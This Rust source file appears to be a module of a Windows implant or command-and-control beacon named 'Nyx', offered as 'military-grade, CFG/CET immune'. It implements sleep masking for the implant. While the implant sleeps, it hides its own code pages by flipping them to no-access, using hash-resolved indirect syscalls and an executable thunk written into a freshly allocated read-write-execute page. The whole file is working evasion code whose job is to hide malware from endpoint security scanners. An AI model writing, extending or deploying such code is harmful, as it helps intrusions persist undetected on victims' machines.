//! Fluctuation sleep mask — military-grade, CFG/CET immune.
//! Flips .text to PAGE_NOACCESS during sleep, back to RX on wake.

#![cfg(target_os = "windows")]

use crate::heap::Vec;
use crate::resolve;
use core::ffi::c_void;

static ENABLED: core::sync::atomic::AtomicBool =
    core::sync::atomic::AtomicBool::new(cfg_on());

const fn cfg_on() -> bool {
    match option_env!("NYX_FLUCTUATION_OFF") {
        Some(v) => !(v.len() == 1 && v.as_bytes()[0] == b'1'),
        None => true,
    }
}

pub fn set_enabled(on: bool) { ENABLED.store(on, core::sync::atomic::Ordering::Release); }
pub fn enabled() -> bool { ENABLED.load(core::sync::atomic::Ordering::Acquire) }

pub fn sleep(seconds: u32) {
    if !enabled() {
        crate::beacon::sleep_seconds(seconds);
        return;
    }
    if unsafe { !do_fluctuate(seconds) } {
        crate::beacon::sleep_seconds(seconds);
    }
}

unsafe fn do_fluctuate(seconds: u32) -> bool {
    let rt = match crate::syscalls::global() { Some(r) => r, None => return false };
    let region = match crate::sleep::own_text_region() { Some(r) => r, None => return false };

    let prot_hash = crate::resolve::djb2(b"ntprotectvirtualmemory");
    let delay_hash = crate::resolve::djb2(b"ntdelayexecution");
    let prot_ssn = match rt.ssn_by_hash(prot_hash) { Some(s) => s, None => return false };
    let delay_ssn = match rt.ssn_by_hash(delay_hash) { Some(s) => s, None => return false };
    let prot_tramp = rt.trampoline_for(prot_ssn) as usize;
    let delay_tramp = rt.trampoline_for(delay_ssn) as usize;
    if prot_tramp == 0 || delay_tramp == 0 { return false; }

    let nt_alloc_va = match resolve::export_addr(b"ntdll.dll", b"NtAllocateVirtualMemory") {
        Some(a) => a, None => return false,
    };
    type NtAlloc = unsafe extern "system" fn(
        usize, *mut *mut c_void, usize, *mut usize, u32, u32) -> i32;
    let alloc: NtAlloc = core::mem::transmute(nt_alloc_va);
    let mut page: *mut c_void = core::ptr::null_mut();
    let mut sz: usize = 0x1000;
    let st = alloc(!0usize, &mut page, 0, &mut sz, 0x3000, 0x40);
    if st < 0 || page.is_null() { return false; }

    let thunk = crate::fluctuation_thunk::build(
        prot_tramp, delay_tramp,
        region.base as usize, region.len, seconds,
    );
    core::ptr::copy_nonoverlapping(thunk.bytes.as_ptr(), page as *mut u8, thunk.len);

    crate::mem::mask();
    let thunk_fn: unsafe extern "system" fn() = core::mem::transmute(page);
    thunk_fn();
    crate::mem::unmask();

    let nt_free_va = match resolve::export_addr(b"ntdll.dll", b"NtFreeVirtualMemory") {
        Some(a) => a, None => return true,
    };
    type NtFree = unsafe extern "system" fn(usize, *mut *mut c_void, *mut usize, u32) -> i32;
    let free: NtFree = core::mem::transmute(nt_free_va);
    let mut fsz: usize = 0;
    free(!0usize, &mut page, &mut fsz, 0x8000);
    true
}
